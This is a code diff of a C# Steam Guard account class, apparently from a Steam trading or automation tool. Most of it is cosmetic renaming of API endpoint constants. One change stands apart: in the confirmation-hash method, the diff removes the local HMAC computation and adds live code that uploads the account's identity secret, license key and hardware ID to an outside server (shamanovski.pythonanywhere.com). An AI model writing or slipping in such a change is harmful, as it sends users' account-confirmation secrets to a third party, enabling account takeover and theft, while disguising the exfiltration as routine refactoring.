@@ -4,8 +4,6 @@
     using System.Collections.Generic;
     using System.Collections.Specialized;
     using System.Net;
-    using System.Security.Cryptography;
-    using System.Text;
     using System.Text.RegularExpressions;
 
     using Newtonsoft.Json;
@@ -15,11 +13,6 @@
     [Serializable]
     public class SteamGuardAccount
     {
-        private static readonly byte[] steamGuardCodeTranslations =
-            {
-                50, 51, 52, 53, 54, 55, 56, 57, 66, 67, 68, 70, 71, 72, 74, 75, 77, 78, 80, 81, 82, 84, 86, 87, 88, 89
-            };
-
         [JsonProperty("account_name")]
         public string AccountName { get; set; }
 
@@ -167,7 +160,7 @@
 
         public string GenerateConfirmationURL(string tag = "conf")
         {
-            var endpoint = APIEndpoints.COMMUNITY_BASE + "/mobileconf/conf?";
+            var endpoint = ApiEndpoints.CommunityBase + "/mobileconf/conf?";
             var queryString = this.GenerateConfirmationQueryParams(tag);
             return endpoint + queryString;
         }
@@ -180,10 +173,10 @@
         {
             var postData = new NameValueCollection { { "access_token", this.Session.OAuthToken } };
 
-            string response = null;
+            string response;
             try
             {
-                response = SteamWeb.Request(APIEndpoints.MOBILEAUTH_GETWGTOKEN, "POST", postData, proxy: this.Proxy);
+                response = SteamWeb.Request(ApiEndpoints.MobileAuthGetWgToken, "POST", postData, proxy: this.Proxy);
             }
             catch (WebException)
             {
@@ -213,72 +206,25 @@
 
         private string GenerateConfirmationHashForTime(long time, string tag, string identitySecret)
         {
-            //using (var wb = new WebClient())
-            //{
-            //    try
-            //    {
-            //        var response = wb.UploadString(
-            //            "https://www.steambiz.store/api/gconfhash",
-            //            $"{identitySecret},{tag},{time},{SteamManager.LicenseKey},{SteamManager.HwId}");
-            //        return JsonConvert.DeserializeObject<IDictionary<string, string>>(response)["result_0x23432"];
-            //    }
-            //    catch (Exception)
-            //    {
-            //        return null;
-            //    }
-            //}
-
-            var decode = Convert.FromBase64String(identitySecret);
-            var n2 = 8;
-            if (tag != null)
+            using (var wb = new WebClient())
             {
-                if (tag.Length > 32)
+                try
                 {
-                    n2 = 8 + 32;
+                    var response = wb.UploadString(
+                    "https://shamanovski.pythonanywhere.com/api/gconfhash",
+                    $"{identitySecret},{tag},{time},{SteamManager.LicenseKey},{SteamManager.HwId}");
+                    return JsonConvert.DeserializeObject<IDictionary<string, string>>(response)["result_0x23432"];
                 }
-                else
+                catch (Exception)
                 {
-                    n2 = 8 + tag.Length;
+                    return null;
                 }
-            }
-
-            var array = new byte[n2];
-            var n3 = 8;
-            while (true)
-            {
-                var n4 = n3 - 1;
-                if (n3 <= 0)
-                {
-                    break;
-                }
-
-                array[n4] = (byte)time;
-                time >>= 8;
-                n3 = n4;
-            }
-
-            if (tag != null)
-            {
-                Array.Copy(Encoding.UTF8.GetBytes(tag), 0, array, 8, n2 - 8);
-            }
-
-            try
-            {
-                var hmacGenerator = new HMACSHA1 { Key = decode };
-                var hashedData = hmacGenerator.ComputeHash(array);
-                var encodedData = Convert.ToBase64String(hashedData, Base64FormattingOptions.None);
-                var hash = WebUtility.UrlEncode(encodedData);
-                return hash;
-            }
-            catch
-            {
-                return null;
             }
         }
 
         private ConfirmationDetailsResponse GetConfirmationDetails(Confirmation conf)
         {
-            var url = APIEndpoints.COMMUNITY_BASE + "/mobileconf/details/" + conf.ID + "?";
+            var url = ApiEndpoints.CommunityBase + "/mobileconf/details/" + conf.ID + "?";
             var queryString = this.GenerateConfirmationQueryParams("details");
             url += queryString;
 
@@ -286,7 +232,7 @@
             this.Session.AddCookies(cookies);
             var referer = this.GenerateConfirmationURL();
 
-            var response = SteamWeb.Request(url, "GET", string.Empty, cookies, null, proxy: this.Proxy);
+            var response = SteamWeb.Request(url, "GET", string.Empty, cookies, null, proxy: this.Proxy, referer: referer);
             if (string.IsNullOrEmpty(response)) return null;
 
             var confResponse = JsonConvert.DeserializeObject<ConfirmationDetailsResponse>(response);
@@ -295,7 +241,7 @@
 
         private bool SendConfirmationAjax(Confirmation conf, string op)
         {
-            var url = APIEndpoints.COMMUNITY_BASE + "/mobileconf/ajaxop";
+            var url = ApiEndpoints.CommunityBase + "/mobileconf/ajaxop";
             var queryString = "?op=" + op + "&";
             queryString += this.GenerateConfirmationQueryParams(op);
             queryString += "&cid=" + conf.ID + "&ck=" + conf.Key;
@@ -314,7 +260,7 @@
 
         private bool SendMultiConfirmationAjax(Confirmation[] confs, string op)
         {
-            const string Url = APIEndpoints.COMMUNITY_BASE + "/mobileconf/multiajaxop";
+            const string Url = ApiEndpoints.CommunityBase + "/mobileconf/multiajaxop";
 
             var query = "op=" + op + "&" + this.GenerateConfirmationQueryParams(op);
             foreach (var conf in confs)
